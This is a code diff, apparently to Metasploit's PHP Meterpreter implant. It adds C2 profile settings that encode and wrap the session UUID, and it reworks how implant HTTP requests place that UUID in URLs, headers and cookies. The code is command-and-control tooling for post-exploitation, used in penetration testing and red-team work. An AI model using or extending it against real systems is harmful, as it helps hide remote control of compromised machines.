@@ -263,7 +263,10 @@ define("TLV_TYPE_C2_CERT_HASH",        TLV_META_TYPE_RAW    | 717);
 define("TLV_TYPE_C2_PREFIX",           TLV_META_TYPE_RAW    | 718);
 define("TLV_TYPE_C2_SUFFIX",           TLV_META_TYPE_RAW    | 719);
 define("TLV_TYPE_C2_ENC_INBOUND",      TLV_META_TYPE_UINT   | 720);
-define("TLV_TYPE_C2_ENC_OUTBOUND",      TLV_META_TYPE_UINT   | 728);
+define("TLV_TYPE_C2_ENC_OUTBOUND",     TLV_META_TYPE_UINT   | 728);
+define("TLV_TYPE_C2_ENC_UUID",         TLV_META_TYPE_UINT   | 729);
+define("TLV_TYPE_C2_UUID_PREFIX",      TLV_META_TYPE_RAW    | 730);
+define("TLV_TYPE_C2_UUID_SUFFIX",      TLV_META_TYPE_RAW    | 731);
 define("TLV_TYPE_C2_PREFIX_SKIP",      TLV_META_TYPE_UINT   | 721);
 define("TLV_TYPE_C2_SUFFIX_SKIP",      TLV_META_TYPE_UINT   | 722);
 define("TLV_TYPE_C2_UUID_COOKIE",      TLV_META_TYPE_STRING | 723);
@@ -1315,6 +1318,12 @@ function parse_c2_verb_config($group_bytes) {
   $config['enc_inbound'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
   $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC_OUTBOUND);
   $config['enc_outbound'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_ENC_UUID);
+  $config['enc_uuid'] = ($tlv != null) ? $tlv['value'] : C2_ENCODING_NONE;
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_PREFIX);
+  $config['uuid_prefix'] = ($tlv != null) ? $tlv['value'] : '';
+  $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_UUID_SUFFIX);
+  $config['uuid_suffix'] = ($tlv != null) ? $tlv['value'] : '';
   $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_PREFIX);
   $config['prefix'] = ($tlv != null) ? $tlv['value'] : null;
   $tlv = packet_get_tlv_raw($group_bytes, TLV_TYPE_C2_SUFFIX);
@@ -2052,29 +2061,55 @@ function http_transport_uuid($transport) {
   return http_get_uuid_from_url($transport['url']);
 }
 
+# Apply the profile's UUID transform (encode + prepend + append) to the
+# raw UUID before placing it in URL/header/cookie. With no profile, the
+# raw UUID is returned unchanged.
+function http_render_uuid($profile, $uuid) {
+  if ($profile == null || strlen($uuid) == 0) {
+    return $uuid;
+  }
+  $enc = isset($profile['enc_uuid']) ? $profile['enc_uuid'] : C2_ENCODING_NONE;
+  $prefix = isset($profile['uuid_prefix']) ? $profile['uuid_prefix'] : '';
+  $suffix = isset($profile['uuid_suffix']) ? $profile['uuid_suffix'] : '';
+  return $prefix . c2_encode($uuid, $enc) . $suffix;
+}
+
+function http_non_c2_url($transport) {
+  # No C2 profile: keep the LURI-bearing base path from $transport['url']
+  # and swap the trailing UUID segment for the current one (metsrv
+  # generate_uri equivalent — honours a patched UUID without mutating
+  # $transport['url']).
+  $url = rtrim($transport['url'], '/');
+  $pos = strrpos($url, '/');
+  $base = ($pos !== false) ? substr($url, 0, $pos) : $url;
+  return $base . '/' . http_transport_uuid($transport);
+}
+
 function http_build_profile_url($transport, $profile) {
-  # Always rebuild from the (untouched) base + current UUID each request,
-  # like metsrv generate_uri, so a patched UUID is honoured without mutating
-  # $transport['url'].
+  if ($profile == null) {
+    return http_non_c2_url($transport);
+  }
+
+  # With a C2 profile: discard LURI from the baked-in URL — the profile's
+  # per-verb `set uri` is the authoritative request path.
   $parsed = parse_url($transport['url']);
   $base = $parsed['scheme'] . '://' . $parsed['host'];
   if (isset($parsed['port'])) { $base .= ':' . $parsed['port']; }
 
   $uri = '';
-  if ($profile != null && isset($profile['uri']) && $profile['uri'] != null) {
+  if (isset($profile['uri']) && $profile['uri'] != null) {
     $uri = $profile['uri'];
     if ($uri[0] != '/') { $uri = '/' . $uri; }
   }
   $url = $base . $uri;
 
-  $uuid = http_transport_uuid($transport);
-  if ($profile != null && isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
+  $uuid = http_render_uuid($profile, http_transport_uuid($transport));
+  if (isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
     if (strlen($uuid) > 0) {
       $sep = (strpos($url, '?') !== false) ? '&' : '?';
       $url .= $sep . $profile['uuid_get'] . '=' . $uuid;
     }
-  } elseif ($profile == null
-            || (empty($profile['uuid_header']) && empty($profile['uuid_cookie']))) {
+  } elseif (empty($profile['uuid_header']) && empty($profile['uuid_cookie'])) {
     # No param/header/cookie placement => carry the id in the URI path.
     if (strlen($uuid) > 0) {
       $url = rtrim($url, '/') . '/' . $uuid;
@@ -2093,13 +2128,13 @@ function http_build_context($transport, $profile, $body = null) {
   }
   if ($profile != null) {
     if (isset($profile['uuid_header']) && $profile['uuid_header'] != null) {
-      $uuid = http_transport_uuid($transport);
+      $uuid = http_render_uuid($profile, http_transport_uuid($transport));
       if (strlen($uuid) > 0) {
         $headers .= $profile['uuid_header'] . ': ' . $uuid . "\r\n";
       }
     }
     if (isset($profile['uuid_cookie']) && $profile['uuid_cookie'] != null) {
-      $uuid = http_transport_uuid($transport);
+      $uuid = http_render_uuid($profile, http_transport_uuid($transport));
       if (strlen($uuid) > 0) {
         $headers .= "Cookie: " . $profile['uuid_cookie'] . '=' . $uuid . "\r\n";
       }
